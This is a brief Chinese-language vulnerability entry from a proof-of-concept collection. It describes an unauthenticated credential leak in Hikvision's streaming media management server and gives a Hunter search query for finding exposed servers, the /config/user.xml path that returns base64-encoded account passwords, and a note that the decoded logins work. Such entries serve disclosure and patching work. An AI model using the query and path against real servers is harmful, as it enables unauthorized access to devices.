# 海康威视流媒体管理服务器 user.xml 账号密码泄漏漏洞

# 一、漏洞简介
HIKVISION 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码

# 二、影响版本
+ HIKVISION 流媒体管理服务器

# 三、资产测绘
+ hunter：`web.body="流媒体管理服务器"&&web.body="杭州海康威视系统技术有限公司 版权所有"`


+ 登录页面


# 四、漏洞复现
```plain
  /config/user.xml
```


账号密码为base64加密

测试登录，登录成功


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xz0uizp3x0yzr3kl>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
